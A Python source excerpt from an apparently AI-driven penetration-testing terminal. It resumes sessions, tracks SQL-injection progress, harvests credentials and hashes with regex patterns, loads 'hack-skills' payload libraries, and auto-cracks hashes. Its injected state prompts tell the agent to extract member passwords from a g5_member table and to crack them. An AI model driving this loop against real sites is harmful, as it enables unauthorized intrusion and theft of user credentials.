                        with open(_tty_path, "rb+", buffering=0) as _tty_rw:
                            _tty_rw.write(b"  > ")
                            _tty_rw.flush()
                            # 5분 타임아웃: 입력 없으면 그냥 skip
                            _rdy, _, _ = _sel_mod.select([_tty_rw], [], [], 300.0)
                            if _rdy:
                                raw = _tty_rw.readline().decode("utf-8", errors="replace").strip()
                            else:
                                return  # 타임아웃 → 메뉴 종료
                    else:
                        raw = input("  > ").strip()
                except (EOFError, KeyboardInterrupt, OSError):
                    return
                finally:
                    try:
                        _sig_mod.signal(_sig_mod.SIGINT, _old_sigint)
                    except Exception:
                        pass

                if raw == "0" or raw == "":
                    self.console.print(
                        f"[{THEME['dim']}]{_s.get('next_steps_skipped', 'Skipped.')}[/]"
                    )
                    return

                if raw.isdigit() and 1 <= int(raw) <= len(options):
                    chosen = options[int(raw) - 1]
                    exec_msg = _s.get("next_steps_executing", "▶ Executing option {n}...").format(n=raw)
                    self.console.print(f"\n[bold cyan]{exec_msg}[/bold cyan]\n")
                    # 선택된 옵션을 침투테스트 명령으로 강제 처리 (_force_pentest=True)
                    # 버그 수정 v3.2.68: 메뉴 옵션 텍스트가 _is_general_question()에 의해
                    # 일반대화로 오분류되어 코드 블록 실행이 생략되던 문제 해결
                    self._send_message(chosen, _force_pentest=True)
                else:
                    # 숫자가 아니면 그대로 입력으로 처리 (메뉴에서 온 입력 → 침투테스트 강제)
                    self._send_message(raw, _force_pentest=True)
            else:
                # 파싱 실패 — 원문 그대로 해커 스타일 박스로 표시
                from rich.panel import Panel as _FallbackPanel
                self.console.print(_FallbackPanel(
                    _esc(full.strip()),
                    border_style=THEME["accent"],
                    padding=(1, 2),
                ))
                self.console.print()

        except Exception as e:
            self._error(f"next steps error: {e}")

    # ── 세션 이어하기 ────────────────────────────────────────────────

    def _history_path(self) -> "Path":
        return Path.home() / ".config" / "bingo" / "last_history.json"

    def _save_history(self) -> None:
        """현재 히스토리 + agent_state + auth_session → 파일 저장 (이어하기용)."""
        import json
        _path = self._history_path()
        try:
            _path.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "history": [{"role": m.role, "content": m.content} for m in self.history[-30:]],
                "agent_state": self._agent_state,
                "loop_count": self._exec_loop_count,
                "auth_session": getattr(self, "_auth_session", {}),
                "last_exec_result": getattr(self, "_last_exec_result", ""),
            }
            _path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
        except Exception:
            pass

    def _offer_resume(self) -> bool:
        """이전 세션이 있으면 이어하기 제안. 복원 성공 시 True 반환."""
        import json
        _path = self._history_path()
        if not _path.exists():
            return False
        try:
            data = json.loads(_path.read_text())
            hist = data.get("history", [])
            state = data.get("agent_state", {})
            target = state.get("target") or ""
            if not hist or not target:
                return False
        except Exception:
            return False

        _lang = getattr(self.config, "lang", "en")
        _labels = {
            "ko": ("이전 세션 발견", f"타겟: {target}", "이어서 작업하시겠습니까?", "계속 [Y/n]: "),
            "zh": ("发现上次会话", f"目标: {target}", "是否继续上次的工作？", "继续 [Y/n]: "),
            "en": ("Previous session found", f"Target: {target}", "Continue from where you left off?", "Resume [Y/n]: "),
        }
        title, tgt_label, question, prompt_str = _labels.get(_lang, _labels["en"])

        from rich.panel import Panel
        self.console.print(Panel(
            f"[bold]{tgt_label}[/bold]\n{question}",
            title=f"[bold cyan]🔄 {title}[/bold cyan]",
            border_style="cyan",
        ))

        try:
            ans = input(prompt_str).strip().lower()
        except Exception:
            ans = "n"

        if ans in ("", "y", "yes"):
            # 히스토리 복원
            self.history = [
                Message(role=m["role"], content=m["content"])
                for m in hist
                if m.get("role") in ("user", "assistant", "system")
            ]
            self._agent_state = {**self._agent_state, **data.get("agent_state", {})}
            self._exec_loop_count = data.get("loop_count", 0)
            # auth_session 복원
            saved_auth = data.get("auth_session", {})
            if saved_auth.get("active"):
                self._auth_session = saved_auth
            # 마지막 실행 결과 복원 (retry용)
            self._last_exec_result = data.get("last_exec_result", "")
            # 이전 세션 복원 — 현재 세션 추적 목록은 빈 상태로 시작
            # (이어서 새로 발견되는 항목만 _session_* 에 누적됨)
            self._session_tables = []
            self._session_credentials = []
            self._session_fresh = False  # 이전 세션 복원 모드

            _resumed = {
                "ko": f"✅ 이전 세션 복원 완료 — 타겟: {target}",
                "zh": f"✅ 已恢复上次会话 — 目标: {target}",
                "en": f"✅ Session restored — target: {target}",
            }.get(_lang, f"✅ Session restored: {target}")
            self.console.print(f"[bold green]{_resumed}[/bold green]\n")
            # v6.2.102: 복원된 타겟 동기화
            try:
                from ..tools_ext.pentest_tools import set_target_domain
                set_target_domain(target)
            except Exception:
                pass
            return True   # 복원 성공 — 자동 재개 신호
        else:
            # 새 세션 시작 — 기존 히스토리 파일 삭제
            try:
                _path.unlink()
            except Exception:
                pass
            # ── 핵심 수정: 이전 세션 agent_state 완전 초기화 (보고서 환각 방지) ──
            # "n" 선택 시 이전 세션의 credentials/tables/db_name 등이
            # 현재 세션 보고서에 포함되는 "보고서 환각" 버그를 방지한다.
            self._reset_agent_state()
            self._session_tables = []
            self._session_credentials = []
            self._session_fresh = True
            _cleared = {
                "ko": "🗑️ 이전 세션 state 초기화 완료 (자격증명·테이블·DB 정보 리셋)",
                "zh": "🗑️ 已清除上次会话状态（凭据/表/数据库信息已重置）",
                "en": "🗑️ Previous session state cleared (credentials/tables/DB reset)",
            }.get(_lang, "🗑️ Previous session state cleared")
            self.console.print(f"[{THEME['dim']}]{_cleared}[/]\n")
            # ── v5.0.9: "n" 선택 시 타겟 메모리 주입 완전 생략 ────────────────
            # 사용자가 새 세션을 선택했다 = 이전 데이터 없이 완전 초기화 원함.
            # 메모리 파일은 디스크에 유지 (나중에 "y" 선택 시 복원 가능).
            # 다만 파일 내 다른 도메인 항목은 조용히 정리해 미래 세션을 위해 보정.
            if self._tm_available and target:
                try:
                    self._tm_purge(target)  # 오염 항목 정리 (표시 없이)
                except Exception:
                    pass
            # 메모리 주입 없음 → AI는 완전히 빈 컨텍스트에서 사용자 입력 대기
            return False

    def _load_agent_state(self) -> dict:
        """저장된 agent_state 로드. 없으면 빈 상태 반환."""
        import json
        default = {
            "target": None, "waf": None,
            "bool_true_len": None, "bool_false_len": None,
            "db_name": None, "tables": [], "columns": {},
            "credentials": [], "confirmed_sqli": False, "notes": [],
        }
        try:
            if self._agent_state_path.exists():
                return {**default, **json.loads(self._agent_state_path.read_text())}
        except Exception:
            pass
        return default

    def _save_agent_state(self) -> None:
        """agent_state를 파일에 저장."""
        import json
        try:
            self._agent_state_path.parent.mkdir(parents=True, exist_ok=True)
            self._agent_state_path.write_text(
                json.dumps(self._agent_state, ensure_ascii=False, indent=2)
            )
        except Exception:
            pass

    def _reset_agent_state(self) -> None:
        """새 타겟 시작 시 agent_state 초기화."""
        self._agent_state = {
            "target": None, "waf": None,
            "bool_true_len": None, "bool_false_len": None,
            "db_name": None, "tables": [], "columns": {},
            "credentials": [], "confirmed_sqli": False, "notes": [],
        }
        self._save_agent_state()

    def _parse_agent_state(self, text: str) -> None:
        """실행 결과 텍스트에서 주요 사실 파싱 → _agent_state에 누적."""
        import re

        # Boolean 기준값
        m = re.search(r"[Tt]rue[:\s=]+(\d+).*?[Ff]alse[:\s=]+(\d+)", text)
        if m and not self._agent_state["bool_true_len"]:
            self._agent_state["bool_true_len"] = int(m.group(1))
            self._agent_state["bool_false_len"] = int(m.group(2))

        # DB 이름
        m = re.search(r"[Dd]atabase(?:\s+name|:)?\s*[:\-=]?\s*([a-zA-Z0-9_]+)", text)
        if m and not self._agent_state["db_name"] and len(m.group(1)) > 1:
            self._agent_state["db_name"] = m.group(1)
        # "dbbarun" 패턴 직접 탐지
        m2 = re.search(r"(?:Database confirmed|DB name):\s*([a-zA-Z0-9_]+)", text)
        if m2:
            self._agent_state["db_name"] = m2.group(1)

        # Boolean wording is model/tool prose, not proof.  Keep the state flag
        # synchronized with the exporter evidence ladder instead.
        if any(
            getattr(_f, "vuln_type", "") == "sqli"
            and getattr(_f, "confidence", "") == "confirmed"
            and bool(getattr(_f, "confirmed", False))
            for _f in getattr(self._findings_exporter, "findings", [])
        ):
            self._agent_state["confirmed_sqli"] = True

        # 테이블 목록
        m = re.search(r"[Ff]ound tables?:\s*\[([^\]]+)\]", text)
        if m:
            tables = [t.strip().strip("'\"") for t in m.group(1).split(",") if t.strip().strip("'\"")]
            for t in tables:
                if t and t not in self._agent_state["tables"]:
                    self._agent_state["tables"].append(t)
                # 현재 세션 추적 (보고서 환각 방지)
                if t and t not in self._session_tables:
                    self._session_tables.append(t)

        # 개별 테이블 존재 확인
        for t in re.findall(r"\[\+\] Table exists(?:: |\()([a-zA-Z0-9_]+)", text):
            if t not in self._agent_state["tables"]:
                self._agent_state["tables"].append(t)
            # 현재 세션 추적 (보고서 환각 방지)
            if t not in self._session_tables:
                self._session_tables.append(t)

        # 컬럼 목록
        m = re.search(r"[Vv]alid columns?:\s*\[([^\]]+)\]", text)
        if m:
            cols = [c.strip().strip("'\"") for c in m.group(1).split(",")]
            db = self._agent_state["db_name"] or "unknown"
            if "g5_member" not in self._agent_state["columns"]:
                self._agent_state["columns"]["g5_member"] = []
            for c in cols:
                if c and c not in self._agent_state["columns"]["g5_member"]:
                    self._agent_state["columns"]["g5_member"].append(c)

        # 자격증명
        cred_match = re.findall(
            r"(mb_id|mb_password|username|password)[:\s=]+([^\n\r,\]]{3,80})", text, re.IGNORECASE
        )
        cred_context_ok = bool(re.search(
            r'credential(?:s)?\s+(?:extracted|dumped|confirmed)|'
            r'valid\s+credential|login\s+success|로그인\s*성공|登录成功|'
            r'real_credential_extract|g5_member|db\s*dump|password\s*hash',
            text,
            re.IGNORECASE,
        ))
        cred_negative_context = bool(re.search(
            r'login\s+failed|invalid\s+password|wrong\s+password|'
            r'가입된\s+회원|비밀번호가\s+틀립니다|登录失败|密码错误|'
            r'===\s*testing.*password|^password\s*:',
            text,
            re.IGNORECASE | re.MULTILINE,
        ))
        if cred_match and cred_context_ok and not cred_negative_context:
            cred = {k.lower(): v.strip() for k, v in cred_match
                    if v.strip() and "~" not in v and "?" not in v and len(v.strip()) > 2}
            filtered_creds = BingoTerminal._filter_verified_report_credentials([cred])
            if filtered_creds:
                cred = filtered_creds[0]
                self._agent_state["credentials"].append(cred)
                # 현재 세션 추적 (보고서 환각 방지)
                self._session_credentials.append(cred)

        # WAF
        m = re.search(r"WAF.*?detected.*?([Cc]loudflare|[Aa]WS|[Mm]od[Ss]ecurity|[Ww]ordfence)", text)
        if m:
            self._agent_state["waf"] = m.group(1)

        # 변경 시 자동 저장
        self._save_agent_state()

    # ── 스킬 시스템 (에이전트 자율 판단) ─────────────────────────
    @staticmethod
    def _format_db_skill(sid: str, sk: dict) -> str:
        """skills_data 항목 → 마크다운 텍스트"""
        lines = [f"### {sk['name']} [{sid}]",
                 f"**{sk.get('desc', '')}**"]
        if sk.get("tools"):
            lines.append(f"Tools: {', '.join(sk['tools'])}")
        if sk.get("commands"):
            lines.append("Commands:")
            for cmd in sk["commands"][:6]:
                lines.append(f"  `{cmd}`")
        if sk.get("payloads"):
            lines.append("Payloads:")
            for p in sk["payloads"][:8]:
                lines.append(f"  - {p}")
        if sk.get("notes"):
            lines.append(f"Notes: {sk['notes']}")
        return "\n".join(lines)

    def _load_skill_content(self, skill_names: list[str]) -> str:
        """지정된 스킬 파일을 읽어 내용 반환.

        검색 순서:
          1. skills/{name}/SKILL.md  (내장 6종)
          2. skills/hack-skills/{name}/SKILL.md  (102종)
          3. skills/local_skills/{name}/SKILL.md  (5종)
          4. hack-skills 부분 이름 매칭
          5. skills_data DB 모듈명 매칭 (235종 — Exploitation, Recon, …)
          6. skills_data DB 태그/이름 부분 매칭
        """
        from pathlib import Path
        skills_dir = Path(__file__).parent.parent / "skills"
        loaded = []
        contents = []

        # ── skills_data 통합 로드 (lazy, 한 번만) ─────────────────
        try:
            from ..skills.skills_data import SKILLS_DB
            from ..skills.skills_data2 import SKILLS_DB_2
            from ..skills.skills_data3 import SKILLS_DB_3
            _all_db: dict = {**SKILLS_DB, **SKILLS_DB_2, **SKILLS_DB_3}
        except Exception:
            _all_db = {}

        for name in skill_names:
            name_clean = name.strip()
            name_lower = name_clean.lower()

            # ── 1~3: SKILL.md 파일 검색 ───────────────────────────
            candidates = [
                skills_dir / name_lower / "SKILL.md",
                skills_dir / "hack-skills" / name_lower / "SKILL.md",
                skills_dir / "hack-skills" / name_clean / "SKILL.md",
                skills_dir / "local_skills" / name_lower / "SKILL.md",
                skills_dir / "local_skills" / name_clean / "SKILL.md",
            ]
            found_file = None
            for p in candidates:
                if p.exists():
                    found_file = p
                    break

            if found_file:
                content = found_file.read_text(encoding="utf-8")
                contents.append(
                    f"=== SKILL: {name_clean.upper()} ===\n{content}\n=== END SKILL: {name_clean.upper()} ==="
                )
                loaded.append(name_clean)
                continue

            # ── 4: hack-skills 부분 이름 매칭 ─────────────────────
            hs_dir = skills_dir / "hack-skills"
            hs_match = None
            if hs_dir.exists():
                for d in sorted(hs_dir.iterdir()):
                    if d.is_dir() and (name_lower in d.name.lower() or d.name.lower() in name_lower):
                        sf = d / "SKILL.md"
                        if sf.exists():
                            hs_match = sf
                            break
            if hs_match:
                content = hs_match.read_text(encoding="utf-8")
                label = hs_match.parent.name.upper()
                contents.append(f"=== SKILL: {label} ===\n{content}\n=== END SKILL: {label} ===")
                loaded.append(hs_match.parent.name)
                continue

            # ── 5: skills_data DB 모듈명 매칭 ─────────────────────
            if _all_db:
                mod_matches = [
                    (sid, sk) for sid, sk in _all_db.items()
                    if sk.get("module", "").lower() == name_lower
                    or sk.get("module", "").lower().replace(" ", "") == name_lower.replace(" ", "")
                    or name_lower in sk.get("module", "").lower()
                ]
                if mod_matches:
                    mod_name = mod_matches[0][1].get("module", name_clean)
                    block = [f"=== SKILL MODULE: {mod_name.upper()} ({len(mod_matches)} skills) ==="]
                    for sid, sk in mod_matches:
                        block.append(self._format_db_skill(sid, sk))
                    block.append(f"=== END SKILL MODULE: {mod_name.upper()} ===")
                    contents.append("\n\n".join(block))
                    loaded.append(f"{mod_name}({len(mod_matches)})")
                    continue

                # ── 6: 태그/이름 부분 매칭 (최대 5개) ───────────────
                tag_matches = [
                    (sid, sk) for sid, sk in _all_db.items()
                    if name_lower in sk.get("name", "").lower()
                    or any(name_lower in t for t in sk.get("tags", []))
                ]
                if tag_matches:
                    block = [f"=== SKILL SEARCH: {name_clean.upper()} ({len(tag_matches[:5])} matches) ==="]
                    for sid, sk in tag_matches[:5]:
                        block.append(self._format_db_skill(sid, sk))
                    block.append(f"=== END SKILL SEARCH: {name_clean.upper()} ===")
                    contents.append("\n\n".join(block))
                    loaded.append(f"{name_clean}(db-match)")
                    continue

        if loaded:
            self.console.print(
                f"[bold cyan]⚡ {self.s.get('skill_loaded', 'Skills loaded')}: {', '.join(loaded)}[/bold cyan]"
            )
        return "\n\n".join(contents)

    def _parse_skill_load_request(self, ai_response: str) -> list[str]:
        """AI 응답에서 SKILL_LOAD: 요청을 파싱. 요청된 스킬 이름 리스트 반환."""
        import re
        m = re.search(r"SKILL_LOAD:\s*([^\n]+)", ai_response)
        if not m:
            return []
        raw = m.group(1)
        skills = [s.strip() for s in re.split(r"[,\s]+", raw) if s.strip()]
        return skills

    def _detect_and_load_skills(self, text: str) -> str:
        """사용자 입력 키워드 기반 초기 스킬 로드.
        engine.local_skill_context()로 전체 스킬DB(1~14)에서 최적 매칭 반환.
        """
        try:
            from ..skills.engine import SkillEngine
            engine = SkillEngine()
            ctx = engine.local_skill_context(text, max_chars=3000)
            return ctx or ""
        except Exception:
            return ""

    def _format_agent_state(self) -> str:
        """agent_state를 AI에게 주입할 요약 문자열로 변환.

        방어 코드: _agent_state 키 누락 시 KeyError 방지 위해 .get() 사용.
        """
        try:
            s = self._agent_state if isinstance(self._agent_state, dict) else {}
            lines = ["=== AGENT ACCUMULATED KNOWLEDGE (DO NOT RE-EXTRACT) ==="]

            if s.get("confirmed_sqli"):
                lines.append("✅ SQLi: CONFIRMED (boolean blind)")
            if s.get("bool_true_len"):
                lines.append(
                    f"✅ Boolean baseline: TRUE={s.get('bool_true_len')}B, "
                    f"FALSE={s.get('bool_false_len')}B (use this, do NOT re-calibrate)"
                )
            if s.get("waf"):
                lines.append(f"✅ WAF: {s.get('waf')}")
            if s.get("db_name"):
                lines.append(f"✅ Database: {s.get('db_name')} (confirmed, do NOT extract again)")
            if s.get("tables"):
                lines.append(f"✅ Tables: {', '.join(s.get('tables', []))} (confirmed, do NOT re-enumerate)")
            if s.get("columns"):
                for tbl, cols in s.get("columns", {}).items():
                    lines.append(f"✅ Columns ({tbl}): {', '.join(cols)}")
            if s.get("credentials"):
                lines.append(f"✅ Credentials found: {s.get('credentials')}")
                lines.append("⚡ NEXT: crack/verify these credentials")
            else:
                if s.get("columns"):
                    lines.append("⚡ NEXT: extract actual DATA from g5_member (mb_id, mb_password)")
                elif s.get("tables"):
                    lines.append("⚡ NEXT: enumerate columns in g5_member")
                elif s.get("db_name"):
                    lines.append("⚡ NEXT: enumerate tables in " + s.get("db_name", ""))
                elif s.get("confirmed_sqli"):
                    lines.append("⚡ NEXT: extract database name")

            lines.append("=== END KNOWLEDGE ===\n")
            return "\n".join(lines) + "\n"
        except Exception:
            return ""

    @staticmethod
    def _has_meaningful_loop_progress(text: str) -> bool:
        """Return True only for execution evidence that advances the mission."""
        import re as _re_progress
        from urllib.parse import urlparse as _urlparse_progress

        if not text:
            return False

        strong_patterns = (
            r"\bBINGO_SIGNAL\s*:",
            r"\b(?:CONFIRMED|VERIFIED)\b",
            r"(?:credential|password|passwd|username)\s*(?:found|extracted|[:=])",
            r"(?:자격증명|비밀번호|계정)\s*(?:발견|추출|[:=])",
            r"(?:凭据|密码|用户名)\s*(?:发现|提取|[:：=])",
            r"(?:database|table|column)\s+(?:name\s+)?(?:extracted|enumerated)",
            r"(?:DB|테이블|컬럼)\s*(?:추출|열거|확인)",
            r"(?:数据库|表名|列名)\s*(?:提取|枚举|确认)",
            r"(?:shell|RCE)\s*(?:obtained|confirmed|verified)",
            r"(?:셸|RCE)\s*(?:획득|확인)",
            r"(?:Shell|RCE)\s*(?:获取|确认)",
        )
        if any(_re_progress.search(p, text, _re_progress.IGNORECASE) for p in strong_patterns):
            return True

        noise_host_markers = (
            "google.", "google-", "googletagmanager", "googleadservices",
            "doubleclick", "googlesyndication", "gstatic", "facebook.",
            "analytics", "hotjar", "clarity.ms", "adservice", "tracking",
            "tagmanager", "pixel",
        )
        noise_path_markers = (
            "/collect", "/gtm.js", "/analytics", "/pixel", "/beacon",
            "/tag/", "/ads/", "/adservice", "/favicon", "/robots.txt",
            "/sitemap.xml",
        )
        static_exts = (
            ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
            ".woff", ".woff2", ".ttf", ".map", ".webp", ".mp4", ".mp3",
        )
        noise_params = {
            "random", "cv", "fst", "fmt", "bg", "rcb", "frm", "auid", "dt",
            "en", "dl", "dr", "sr", "vp", "cid", "tid", "gtm", "_ga", "_gl",
            "utm_source", "utm_medium", "utm_campaign",
        }
        high_value_path_markers = (
            "api", "auth", "jwt", "token", "login", "logout", "admin",
            "user", "member", "account", "mypage", "profile", "order",
            "payment", "checkout", "loan", "apply", "upload", "file",
            "storage", "download", "report", "search", "product", "cart",
            "graphql", "oauth", "password", "reset", "verify", "session",
            "callback",
        )
        high_value_params = (
            "id", "idx", "uid", "user", "userid", "user_id", "member",
            "member_id", "no", "seq", "token", "jwt", "redirect", "return",
            "next", "url", "uri", "file", "path", "q", "query", "search",
            "page", "order", "order_id", "product", "product_id", "callback",
            "loreqtno",
        )

        def _actionable_endpoint(endpoint: str, param: str = "") -> bool:
            endpoint = endpoint.strip().strip("'\"`),]")
            param_l = (param or "").strip().lower()
            try:
                parsed = _urlparse_progress(endpoint)
            except Exception:
                parsed = None
            host = (parsed.netloc if parsed else "").lower()
            path = (parsed.path if parsed and parsed.path else endpoint).lower()
            if host and any(marker in host for marker in noise_host_markers):
                return False
            if any(marker in path for marker in noise_path_markers):
                return False
            if path.endswith(static_exts):
                return False
            if param_l in noise_params:
                return False
            if any(marker in path for marker in high_value_path_markers):
                return True
            return any(param_l == hv or param_l.endswith(hv) for hv in high_value_params)

        endpoint_param_re = _re_progress.compile(
            r"(?m)(https?://[^\s\"'<>]+|/[A-Za-z0-9_./?=&%:-]+)\s*->\s*([A-Za-z_][A-Za-z0-9_-]*)"
        )
        for match in endpoint_param_re.finditer(text):
            if _actionable_endpoint(match.group(1), match.group(2)):
                return True

        explicit_endpoint_re = _re_progress.compile(
            r"(?:new\s+high[- ]value\s+endpoint|"
            r"高价值端点|"
            r"고가치\s*엔드포인트)\s*[:：]?\s*(https?://[^\s\"'<>]+|/[A-Za-z0-9_./?=&%:-]+)",
            _re_progress.IGNORECASE,
        )
        for match in explicit_endpoint_re.finditer(text):
            if _actionable_endpoint(match.group(1)):
                return True

        return False

    @staticmethod
    def _meaningful_loop_progress_signature(text: str) -> str:
        """Stable signature for novel progress de-duplication."""
        import hashlib as _hash_progress
        import re as _re_progress_sig

        if not text:
            return ""
        signal_re = _re_progress_sig.compile(
            r"(?:"
            r"CONFIRMED|VERIFIED|credential|password|passwd|username|"
            r"database|table|column|endpoint|TRACE|clickjacking|csrf|"
            r"x-frame-options|frame-ancestors|content-security-policy|"
            r"RCE|shell|BINGO_SIGNAL|VULNERABLE|HIGH|CRITICAL"
            r")",
            _re_progress_sig.IGNORECASE,
        )
        lines: list[str] = []
        for line in text.splitlines():
            stripped = line.strip()
            if not stripped or not signal_re.search(stripped):
                continue
            stripped = _re_progress_sig.sub(
                r"BINGO(?:_[A-Z0-9]+){1,}|TRACE_[A-Z0-9_]+|[a-f0-9]{16,}",
                "<id>",
                stripped,
                flags=_re_progress_sig.IGNORECASE,
            )
            stripped = _re_progress_sig.sub(r"\b\d{5,}\b", "<n>", stripped)
            lines.append(stripped.lower()[:240])
            if len(lines) >= 24:
                break
        if not lines:
            return ""
        return _hash_progress.sha256("\n".join(lines).encode("utf-8")).hexdigest()[:16]

    @staticmethod
    def _hashes_from_error_context(text: str, hashes: list[str]) -> set[str]:
        """Identify hex identifiers embedded in error/trace messages."""
        import re as _re_hash_ctx

        lowered = text.lower()
        error_re = _re_hash_ctx.compile(
            r"(?:error|exception|trace(?:back)?|request[ _-]?id|trace[ _-]?id|"
            r"tracking[ _-]?id|input length too long|http\s*400|400\s+input)"
        )
        rejected: set[str] = set()
        for value in hashes:
            start = 0
            needle = value.lower()
            while True:
                pos = lowered.find(needle, start)
                if pos < 0:
                    break
                context = lowered[max(0, pos - 120):pos + len(needle) + 120]
                if error_re.search(context):
                    rejected.add(needle)
                    break
                start = pos + len(needle)
        return rejected

    def _collect_crack_hashes(self, text: str) -> None:
        """v6.2.147: 에이전트 루프 중 해시 수집만 — 스레드 시작 없음.
        _execute_ai_commands 내부 루프에서 호출. 실제 크랙은 루프 완료 후
        _notify_hashes_found()가 _pending_crack_hashes를 flush할 때 시작됨.
        → 해시 크랙 출력과 BASH 도구 출력 인터리빙 문제 해결 (Type A 자동 교정기).
        """
        import re as _re_hf
        from ..tools.hash_crack import extract_hashes_from_text

        # 파일명/URL 캐시버스팅 해시 → 블록리스트에 추가
        _fname_hash_re = _re_hf.compile(
            r"""(?<=[._\-/])([0-9a-fA-F]{32,64})(?=\.[a-zA-Z]{2,5}(?:[?&#\s"')|]|$))"""
        )
        for _fhm in _fname_hash_re.finditer(text):
            self._session_cracked_hashes.add(_fhm.group(1).lower())

        # Session/cookie tokens can be syntactically identical to MD5/NTLM.
        # Record them globally for the session before generic hash extraction so
        # later standalone echoes of the same token are still excluded.
        _session_token_values = {
            match.group(1).lower()
            for match in _re_hf.finditer(
                r'''(?:JSESSIONID|PHPSESSID|ASP\.NET_SessionId|session(?:_?id)?|'''
                r'''sessid|SID|csrftoken|auth(?:_token)?|remember_token)'''
                r'''\s*(?:=|["']?\s*,\s*["'])\s*["']?([0-9a-fA-F]{16,128})''',
                text,
                _re_hf.IGNORECASE,
            )
        }
        self._session_cracked_hashes.update(_session_token_values)

        raw_hashes    = extract_hashes_from_text(text, strict=False)
        hashes_strict = extract_hashes_from_text(text, strict=True)
        _error_context_hashes = self._hashes_from_error_context(text, hashes_strict)
        for _error_hash in _error_context_hashes:
            self._session_cracked_hashes.add(_error_hash)

        _strict_set  = {h.lower() for h in hashes_strict}
        fp_filtered  = [h for h in raw_hashes if h.lower() not in _strict_set]
        fp_filtered.extend(
            h for h in hashes_strict if h.lower() in _error_context_hashes
        )
        fp_filtered.extend(
            h for h in hashes_strict if h.lower() in _session_token_values
        )
        new_hashes   = [
            h for h in hashes_strict
            if h.lower() not in self._session_cracked_hashes
        ]

        # 즉시 세션에 등록 (중복 크랙 방지)
        for _h in new_hashes:
            self._session_cracked_hashes.add(_h.lower())

        _lang = getattr(self.config, "lang", "en")
        if fp_filtered:
            _msg_fp = {
                "ko": f"[dim]🔍 오탐 제외: {len(fp_filtered)}개 hex 문자열이 오류코드/추적ID로 판단되어 크랙 건너뜀[/dim]",
                "zh": f"[dim]🔍 误报过滤: {len(fp_filtered)}个十六进制字符串被识别为错误码/追踪ID，已跳过破解[/dim]",
                "en": f"[dim]🔍 False-positive filter: {len(fp_filtered)} hex string(s) skipped (error code / tracking ID)[/dim]",
            }.get(_lang, f"[dim]🔍 Filtered {len(fp_filtered)} non-hash hex string(s)[/dim]")
            self.console.print(_msg_fp)

        # 큐에 추가 (중복 제외)
        for _h in new_hashes:
            if _h not in self._pending_crack_hashes:
                self._pending_crack_hashes.append(_h)

    def _notify_hashes_found(self, text: str) -> None:
        """AI 응답에서 해시 감지 시 자동 온라인 조회 → 오프라인 크랙 파이프라인 실행.
        v6.2.147: _execute_ai_commands 루프 완료 후 호출되어 pending 큐를 flush.
        루프 도중 _collect_crack_hashes()로 모인 해시를 한 번에 크랙 → 인터리빙 방지.
        (컨텍스트 필터: 오류코드/추적ID/파일명 캐시버스팅 해시 자동 제외 + 세션 중복 방지)
        """
        # 현재 text에서도 수집 (initial full_response 포함)
        self._collect_crack_hashes(text)

        # pending 큐에서 크랙할 해시 수집
        new_hashes = list(self._pending_crack_hashes)
        self._pending_crack_hashes.clear()

        _lang = getattr(self.config, "lang", "en")

        # 세션 중복 메시지 (pending flush 단계에서 통합 출력)
        # (이미 _collect_crack_hashes에서 session dedup 완료 — 여기선 새 해시만 남음)

        if not new_hashes:
            # 크레덴셜 발견 키워드 감지 → 크리티컬 알림 (해시 없음, 평문 발견)
            _cred_signals = [
                "password:", "username:", "admin:", "passwd=", "pw=",
                "크레덴셜", "비밀번호 발견", "credential found", "凭据", "密码"
            ]
            if any(s in text.lower() for s in _cred_signals):
                _t = {"ko": "🚨 BINGO — 크레덴셜 발견!", "zh": "🚨 BINGO — 发现凭据!", "en": "🚨 BINGO — Credential Found!"}.get(_lang, "🚨 BINGO — Critical!")
                _b = {"ko": "관리자 자격증명이 발견되었습니다.", "zh": "发现了管理员凭据。", "en": "Admin credentials have been found."}.get(_lang, "Credential found.")
                self._send_notification(_t, _b, critical=True)
            return

        self.console.print(
            f"\n[{THEME['warn']}]{self.s['hash_found'].format(n=len(new_hashes))}[/]"
        )
        _ht = {"ko": f"🔑 BINGO — 해시 {len(new_hashes)}개 발견!", "zh": f"🔑 BINGO — 发现 {len(new_hashes)} 个哈希!", "en": f"🔑 BINGO — {len(new_hashes)} hash(es) found!"}.get(_lang, f"🔑 {len(new_hashes)} hashes found")
        _hb = {"ko": "자동 크랙 시작됨", "zh": "自动破解已启动", "en": "Auto-crack started"}.get(_lang, "Auto-crack started")
        self._send_notification(_ht, _hb, critical=True)

        # 입력 프롬프트를 열기 전에 완료해 prompt_toolkit과 Rich 출력 경합을 막는다.
        self._stop_crack_flag.clear()
        self._auto_crack_pipeline(new_hashes)
    def _auto_crack_pipeline(self, hashes: list[str]) -> None:
        """
        자동 크랙 파이프라인 (입력 프롬프트 복귀 전 실행)
        Step 1: 온라인 해시 조회 (여러 사이트 순서대로)
        Step 2: 미해결 해시 → 오프라인 크랙 (john/hashcat/python)
        /stop 입력 시 즉시 중단
        """
        from ..tools.hash_lookup import OnlineHashLookup, LookupResult
        from ..tools.hash_crack import HashCracker
        from rich.table import Table as RichTable

        def log(msg: str) -> None:
            if not self._stop_crack_flag.is_set():
                self.console.print(f"[{THEME['dim']}]{msg}[/]")

        cracked: dict[str, str] = {}   # hash → plaintext
        pending = list(hashes)

        # ── Step 1: 온라인 조회 ──────────────────────────────────────
        self.console.print(f"[{THEME['secondary']}]  {self.s['hash_online']}[/]")

        def log_visible(msg: str) -> None:
            """온라인 조회 진행 상황 실시간 출력"""
            if self._stop_crack_flag.is_set():
                return
            # 중요 메시지는 컬러로 강조
            if "✓" in msg or "crackstation" in msg.lower() or "hashes.com" in msg.lower():
                self.console.print(f"  [{THEME['dim']}]{msg}[/]")
            elif "⚠" in msg or "불가" in msg or "불가능" in msg or "no_online" in msg.lower():
                self.console.print(f"  [{THEME['warn']}]{msg}[/]")
            elif "→" in msg:
                self.console.print(f"  [{THEME['secondary']}]{msg}[/]")
            else:
                self.console.print(f"  [{THEME['dim']}]{msg}[/]")

        lookup = OnlineHashLookup(on_progress=log_visible)

        for h in list(pending):
            if self._stop_crack_flag.is_set():
                self.console.print(f"[{THEME['warn']}]{self.s['hash_stopped']}[/]")
                return
            h_safe = h.replace("[", r"\[").replace("*", r"\*")
            self.console.print(
                f"  [{THEME['dim']}]{self.s['hash_checking']}: {h_safe[:35]}...[/]"
            )
            result: LookupResult = lookup.lookup(h)
            if result.found and result.plaintext:
                cracked[h] = result.plaintext
                self.console.print(
                    f"  [{THEME['success']}]✓ [{result.source}] "
